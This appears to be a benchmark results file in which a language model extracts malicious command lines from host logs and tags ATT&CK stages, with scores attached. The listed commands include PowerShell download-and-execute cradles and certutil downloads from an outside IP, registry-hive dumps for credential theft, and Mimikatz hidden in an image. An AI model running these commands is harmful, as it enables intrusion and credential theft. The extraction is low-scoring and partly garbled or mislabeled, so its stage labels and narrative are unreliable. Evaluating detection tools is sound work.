@@ -1,0 +1,186 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\47\ufffd\u0526\u2026\ufffd\ufffd\ufffd\ufffd\u01b7\u2026\u0411\u0411\u05e4\u2026\u0412\u2026\u0432\u2026\u0437\u2026\u044f\u2026\u043d\u2026\u0430\u2026\u0443\u2026\u043e\u2026\u0435\u2026\u0455\u2026\u0459\u2026\u0257\u2026\u0432\u2026\u043c\u2026\u043f\u2026\u043b\u2026\u0440\u2026\u0418\u2026\u0438\u2026\u0427\u2026\u0431\u2026\u0447\u2026\u0446\u2026\u0448\u2026",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\\\"\"",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType \\\"application/json\\ \"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType \\\"application/json\\ \"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType \\\"application/json\\ \"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"net group \\\"domain admins\\\" /domain\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"net group \\\"domain admins\\\" /domain\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"net group \\\"domain admins\\\" /domain\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "certutil.exe -urlcache -split -f http://124.223.85.207:8082/Test.hta",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "certutil.exe -urlcache -split -f http://124.223.85.207:8082/Test.hta",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "certutil.exe -urlcache -split -f http://124.223.85.207:8082/Test(hta",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "certutil.exe -urlcache -split -f http://124.223.85.207:8082/Test.hta",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "reg.exe save hklm\\security c:\\users\\admini~1\\appdata\\local\\temp\\tjbvkjpetfjp",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "reg.exe save hklm\\security c:\\users\\admini~1\\appdata\\local\\temp\\tjbvkjpetfjp",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "reg.exe save hklm\\system c:\\users\\admini~1\\appdata\\local\\temp\\qsdirkg",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "reg.exe save hklm\\security c:\\users\\admini~1\\appdata\\local\\temp\\tthwwf",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "reg.exe save hklm\\security c:\\users\\admini~1\\appdata\\local\\temp\\tjbvkjpetfjp",
+        "stage": "Persistence"
+      },
+      {
+        "command": "reg.exe save hklm\\system c:\\users\\admini~1\\appdata\\local\\temp\\qsdirkg",
+        "stage": "Persistence"
+      },
+      {
+        "command": "reg.exe save hklm\\security c:\\users\\admini~1\\appdata\\local\\temp\\tthwwf",
+        "stage": "Persistence"
+      },
+      {
+        "command": "C:\\Windows\\Servicing\\TrustedInstaller.exe",
+        "stage": "Persistence"
+      },
+      {
+        "command": "TiWorker.exe -Embedding",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \\\"rundll32 user32.dll,LockWorkStation\\ \"",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \\\"rundll32 user32.dll,LockWorkStation\\ \"",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-WebReqest \\\"http://124.223.85.207:8082.Test.hta\\ \"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -Command \\\"($wc = new-object System.Net.WebClient)\\;$wc.DownloadString('http://124.223.85.207:8082/Test.hta');\\\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -Command \\\"($wc = new-object System.Net.WebClient)\\;$wc.DownloadString('http://124.223.85.207:8082/Test.hta');\\\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "curl.exe -O microsoft_edge_update.exe",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "sangforcat.exe -v -server https://124.223.85.207:8443",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "sangforcat.exe -v -server https://124.223.85.207:8443",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \\\"Invoke-RestMethod http://124.223.85.207:8082/Test.hta\\ \"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \\\"Invoke-RestMethod http://124.223.85.207:8082/Test.hta\\ \"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Import-Module .\\Invoke-PSImage.ps1;Invoke-PSImage -Script .\\Invoke-Mimikatz.ps1 -Out .\\evil-kiwi.png -Image .\\995647.jpg",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Import-Module .\\Invoke-PSImage.ps1;Invoke-PSImage -Script .\\Invoke-Mimikatz.ps1 -Out .\\evil-kiwi.png -Image .\\995647.jpg",
+        "stage": "Collection"
+      },
+      {
+        "command": "tor.lnk",
+        "stage": "Lateral Movement"
+      }
+    ],
+    "narrative": "This analysis revealed multiple signs of potential malware activity on the host. The initial access vector appears to be through PowerShell scripts downloaded from an unknown source via web requests made by the script itself. These scripts attempt various techniques such as code injection, credential dumping, privilege escalation, persistence methods using registry keys, DLL sideloading, creating malicious shortcuts, disabling UAC, modifying scheduled tasks, executing shellcode, and more. It also attempts lateral movement using Tor and Mimikatz along with password cracking tools.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 58867,
+      "completion_tokens": 1633,
+      "total_tokens": 60500,
+      "wall_clock_s": 26.458,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.11764705882352941,
+      "recall": 0.25,
+      "f1": 0.15999999999999998,
+      "tp": 4,
+      "fp": 30,
+      "fn": 12
+    },
+    "stage": {
+      "precision": 0.08823529411764706,
+      "recall": 0.1875,
+      "f1": 0.12,
+      "tp": 3,
+      "fp": 31,
+      "fn": 13,
+      "recall_partial": 0.10714285714285714
+    },
+    "hallucination_rate": 0.2222222222222222,
+    "cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 58867,
+      "completion_tokens": 1633,
+      "total_tokens": 60500,
+      "wall_clock_s": 26.458,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "v3_stagedefs",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe"
+  }
+}
